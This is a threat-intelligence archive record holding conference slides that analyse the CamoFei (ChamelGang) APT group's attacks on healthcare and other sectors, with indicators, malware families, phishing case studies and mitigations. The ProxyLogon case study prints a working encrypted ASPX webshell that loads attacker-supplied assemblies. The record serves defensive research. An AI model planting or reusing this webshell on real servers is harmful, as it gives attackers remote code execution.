{
    "id": "d6da40d4-8490-4b43-ac8b-7536be9399ea",
    "created_at": "2023-08-24T02:07:45.395086Z",
    "updated_at": "2025-03-27T02:10:19.768445Z",
    "deleted_at": null,
    "sha1_hash": "e04bb9387fa8bebff895d3c0b75a2ee632c6a0f8",
    "title": "Unmasking CamoFei",
    "authors": "",
    "file_creation_date": "2023-08-16T17:02:01Z",
    "file_modification_date": "2023-08-16T17:02:01Z",
    "file_size": 3567381,
    "plain_text": "# Unmasking CamoFei\n\n###### An In-depth Analysis of an Emerging APT Group Focused on\n Healthcare Sectors in East Asia\n\n Still Hsu, DuckLL\n\n\n-----\n\n### About us\n\n###### Still Hsu (Azaka)\n\n • Threat Intelligence Researcher @ TeamT5\n • Non-binary (they/them)\n • Part-time streamer\n\n\n###### Zih-Cing Liao (aka DuckLL)\n\n • Sr.Threat IntelligenceResearcher @ TeamT5\n • Speaker of Conferences:\n Black Hat Asia, HITB, HITCON, CODE BLUE\n • UCCU Hacker Core Member\n\n\n-----\n\n### AGENDA\n\n###### 01 Introduction\n\n 02 TTPs\n\n 03 Case Study\n\n 04 Conclusion\n\n\n-----\n\n## Introduction\n\n\n-----\n\n### CamoFei\n\n\n\n- China-nexus APT threat group\n\n- First seen: End of 2019\n\n- Footprint Concealing\n\n- Malware:\n\n  - Cobalt Strike\n\n  - DoorMe\n\n  - IISBeacon\n\n  - Timinp\n\n  - MGDrive\n\n  - AukDoor\n\n  - CatB Ransomware\n\n\n-----\n\n### Related Work\n\n###### ◆ Positive Technologies in 2021\n\n ◆ ChamelGang\n\n ◆ ProxyShell Exploit\n\n ◆ Malware\n\n  - BeaconLoader & Cobalt Strike\n\n  - ProxyT\n\n  - DoorMe\n\nhttps://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/new-apt-group-chamelgang/\n\n\n-----\n\n### Target Country\n\n- Taiwan, Vietnam, Philippines, Thailand, India, Turkey, Brazil, Hong Kong\n\n- Russia, US, Japan, Afghanistan Lithuania, Nepal\n\n\n-----\n\n### Target Industry\n\n\n-----\n\n### Target Industry\n\n\n-----\n\n### Critical Infrastructure\n\n###### Energy Water Communication Transportation\n\n Finance Healthcare Government High-Tech\n\n\n-----\n\n### Covid-19\n\n\nhttps://ourworldindata.org/explorers/coronavirus-data-explorer\n\n\n-----\n\n### Motivation\n\n###### Money PII DoS\n\n Knowledge Information Operation\n\n\n-----\n\n### Common Issues\n\n###### OT Security Lack of Security Staff\n\n Complex System Outdated Hardware\n and Network and Software\n\n\n-----\n\n### News\n\nhttps://edition.cnn.com/2023/06/12/politics/cyberattack-hospital-closure/index.html\n\n\nhttps://www.cnbc.com/2023/07/10/hca-healthcare-patient-data-stolen-and-for-sale-by-hackers.html\n\nhttps://www.bleepingcomputer.com/news/security/north-korean-ransomware-attacks-on\nhealthcare-fund-govt-operations/\n\n\n-----\n\n### HITCON Zero-day\n\n\n-----\n\n## TTPs: Initial Access\n\n\n-----\n\n### Spear phishing\n\n\n-----\n\n### Exploitation\n\n###### https://proxylogon.com/\n\n\n-----\n\n### Exploitation\n\n\n-----\n\n## TTPs: Malware\n\n\n-----\n\n### Primary Arsenal\n\n\n\n- Cobalt Strike\n\n  - Special loader\n\n- MGDrive\n\n  - Google Drive tool\n\n- AukDoor\n\n  - Linux backdoor\n\n- DoorMe\n\n  - IIS-based backdoor\n\n- Timinp\n\n- CatB Ransomware\n\n\n-----\n\n#### Cobalt Strike (Custom Loaders)\n\n\n-----\n\n### Cobalt Strike (Watermark)\n```\n                                   Date MD5 Watermark\n                                    2020-05-20 9a221336204d671fafd830c84d9bdc26 985457035\n                                    2021-02-26 897bfb316d2e8ff72031a3332842be0f 1421888813\n                                    2021-09-17 90cc1835823d5f86cd1947b03e6111a9 1028153346\n                                    2021-09-18 6a3c69384237078b6ab03ab7c38970ca 1028153346\n                                    2021-10-26 76449d55107fcc7cd666514892879aae 1570652404\n                                    2022-03-24 426ee09eaa0d8940ac5f730d1c48be7c 164069343\n                                    2022-04-21 634c08a0dac337f3c2cde4dfdd03ca5f 1028153346\n                                    2022-04-21 9755ee49da758de56286ee9fc512ed5d 363348564\n                                    2023-02-08 9c5658ba8a8ab9e92c96f13247d3b17e 373441684\n                                    2023-02-15 6171eaf5a3ac9500c8043d2fecc589cd 1444764933\n                                    2023-03-10 0d76b20ab79afaf650aa12ea7e448d2f 1578452238\n                                    2023-04-21 900ead32a061c7047a4e438589102d25 0\n                                    2023-06-28 f8c137c83b6dfdeb9f0403ea7e2c51c7 1299761752\n\n```\n\n-----\n\n### MGDrive\n\n\n\n###### • Government agency\n • MGD.dll\n\n\n-----\n\n### DoorMe\n\n\n###### Compiler-level obfuscation\n\n\n-----\n\n### DoorMe\n\n\n-----\n\n### Timinp\n\n\n-----\n\n### Timinp\n\n\n-----\n\n### CatB Ransomware\n\n- Discovered in a TW\n\n###### telecommunication agency\n\n  - Uses the same MSDTC chain\n\n###### they’ve been using for 3+ years\n\n  - Uses similar decoding\n\n###### mechanism\n\n  - Signed with valid certificate\n\n###### from “coolschool”\n\n\n-----\n\n### CatB Ransomware\n\n- Signed with valid certificate from\n\n###### “coolschool”\n\n  - Several samples linked to the certificate\n\n###### contains icon hash linked to Case Study #1\n\n\n-----\n\n### CatB Ransomware\n\n                 - Matches pattern used by same actor\n\n###### discovered in other cases\n\n                      - `<noun>[A-Z][\\d]{3,4}@protonmail.com`\n\n                 - BTC wallet only had tiny bit of traffic on\n\n###### April 29, 2023\n\n\n-----\n\n### CatB Ransomware\n\n- Similar samples use identical email pattern & provider\n\n- Uses .bak9 extension\n\n  - Matches another ransomware incident against Indian medical university\n\n  - Also linked to a Chinese-nexus group based on INCERT investigation\n\n\n-----\n\n### CatB Ransomware\n\n- Similar samples use identical email pattern & provider\n\n- Uses .bak9 extension\n\n  - Matches another ransomware incident against Indian medical university\n\n  - Also linked to a Chinese-nexus group based on INCERT investigation\n\nhttps://indianexpress.com/article/cities/delhi/aiims-cyber-attack\nat-least-five-servers-infected-have-data-of-3-4-crore-patients\n8297028/\n\n\n-----\n\n### Use of Various Hacktools\n\n\n-----\n\n### Use of Various Hacktools\n\n\n-----\n\n## TTPs: Infrastructures\n\n\n-----\n\n### Use of Cloud Services\n\n##### GitHub Google Drive\n\n###### (C2 download) (MGDrive, Timinp)\n\n\n-----\n\n### C2 Stations\n\n\n###### 4\n\n Romania\n USA 1\n 4\n\n\n-----\n\n## Case Study #1 Spear phishing -> Healthcare\n\n\n-----\n\n### Spear phishing #1\n\n- Email was sent via a legitimate email server\n\n###### from a tertiary school\n\n  - Compromised and abused\n\n###### ◆ Fake resume as lure\n\n- Self-extracted RAR\n\n  - Contains a resume, encoded Cobalt Strike\n\n###### Beacon and its loader\n\n\n-----\n\n### Spear phishing #1\n\n\n-----\n\n### Spear phishing #2\n\n- Fake resume for volunteering at a certain\n\n###### healthcare organization as lure\n\n- Self-extracted RAR\n\n  - Contains a resume, encoded Cobalt\n\n###### Strike Beacon and its loader\n\n\n-----\n\n### Spear phishing #2\n\n\n-----\n\n### Spear phishing #3\n\n- Generic dental advice as lure\n\n- Self-extracted RAR\n\n  - Contains a document, custom loader, and\n\n###### encoded Cobalt Strike beacon inside an encrypted ZIP file\n\n  - Encrypted ZIP embedded\n\n    - Contains “CFG1D19”\n\n  - Decimal-encoded payload\n\n    - Still used by the same group till this day\n\n\n-----\n\n### Spear phishing #3\n\n\n-----\n\n### Summary\n\n\n\n- All the spear phishing files were prepped\n\n###### almost simultaneously with the launch of the attack\n\n  - May 2020\n\n- Heavily abused Cobalt Strike\n\n  - Uses decimal-encoded payload\n\n  - Part of their arsenal even till present\n\n###### day\n\n\n-----\n\n## Case Study #2 ProxyLogon Post-exp\n\n\n-----\n\n### Attack Flow\n\n\n-----\n\n### Attack Flow\n\n```\n<%@Page Language=\"C#\"%>\n<%\n  HttpContext h=HttpContext.Current;\n  string s=\"c01bc5249636a40d\";\n  h.Application.Set(\"k\",s);\n  try\n  {\n     byte[]\nk=Encoding.Default.GetBytes(s),c=h.Request.BinaryRead(h.Request.\nContentLength);\n     System.Reflection.Assembly.Load(new\nSystem.Security.Cryptography.RijndaelManaged().CreateDecryptor(k\n,k).TransformFinalBlock(c,0,c.Length)).CreateInstance(\"U\");\n  }catch(Exception e)\n  {\n  }\n%>\n\n```\n\n-----\n\n### Attack Flow\n\n\n-----\n\n### Attack Flow\n\n```\nSystem.Data.DataSet ds = new System.Data.DataSet();\nSystem.Data.SqlClient.SqlCommand cmd = new\nSystem.Data.SqlClient.SqlCommand(sqlStr,\nconnection);\nSystem.Data.SqlClient.SqlDataAdapter da = new\nSystem.Data.SqlClient.SqlDataAdapter(cmd);\nda.Fill(ds);\nSystem.Data.DataTable dataTable = ds.Tables[0];\nif (dataTable.Rows.Count==0)\n{\n  lblInfo.Text = \"没有需要导出的数据！\";\n  lblInfo.ForeColor = System.Drawing.Color.Blue;\n  return;\n}\n\n```\n\n-----\n\n### Attack Flow\n\n\n-----\n\n### Summary\n\n\n\n- Attack occurred around mid-September\n\n###### 2021\n\n- Leverages unpatched exploits and\n\n###### numerous open-source projects as part of the post-exploitation actions\n\n- Deploys various webshells and .NET\n\n###### backdoors\n\n- Relies heavily upon the MSDTC DLL\n\n###### hijacking technique\n\n\n-----\n\n## Conclusion\n\n\n-----\n\n### Key Takeaways\n\n###### ◆ CamoFei has launched massive attacks all over the world\n\n ◆ APT attacks targeting healthcare is increasing and expanding\n\n ◆ CamoFei TTP\n\n  - Abuse legitimate Windows service as a launcher\n\n  - Abuse cloud service for anti-tracking\n\n  - Use ransomware to erase the traces\n\n\n-----\n\n### Mitigation\n\n###### ◆ Healthcare should strengthen its security capabilities\n\n ◆ Double-check emails\n\n ◆ Update and patch software vulnerabilities\n\n ◆ Limit the usage of cloud services\n\n\n-----\n\n## THANK YOU!\n\n\n###### Zih-Cing Liao\n\n duckll@teamt5.org\n\n\n###### links.azaka.fun\n\n still@teamt5.org\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "http://stillu.cc/assets/slides/2023-08-Unmasking%20CamoFei.pdf"
    ],
    "report_names": [
        "2023-08-Unmasking%20CamoFei.pdf"
    ],
    "threat_actors": [
        {
            "id": "4434c71b-c424-4c06-b923-4f3f54f24f40",
            "created_at": "2022-10-25T16:07:23.453526Z",
            "updated_at": "2025-03-27T02:02:09.810373Z",
            "deleted_at": null,
            "main_name": "ChamelGang",
            "aliases": [
                "CamoFei"
            ],
            "source_name": "ETDA:ChamelGang",
            "tools": [
                "7-Zip",
                "Agentemis",
                "BeaconLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DoorMe",
                "FRP",
                "Fast Reverse Proxy",
                "ProxyT",
                "Tiny SHell",
                "cobeacon",
                "tsh"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a0673493-5872-49a0-8d0d-4391302cff01",
            "created_at": "2023-03-04T02:01:54.10107Z",
            "updated_at": "2025-03-27T02:00:03.121756Z",
            "deleted_at": null,
            "main_name": "Chamelgang",
            "aliases": [
                "CamoFei"
            ],
            "source_name": "MISPGALAXY:Chamelgang",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1692842865,
    "ts_updated_at": 1743041419,
    "ts_creation_date": 1692205321,
    "ts_modification_date": 1692205321,
    "files": {
        "pdf": "https://archive.orkl.eu/e04bb9387fa8bebff895d3c0b75a2ee632c6a0f8.pdf",
        "text": "https://archive.orkl.eu/e04bb9387fa8bebff895d3c0b75a2ee632c6a0f8.txt",
        "img": "https://archive.orkl.eu/e04bb9387fa8bebff895d3c0b75a2ee632c6a0f8.jpg"
    }
}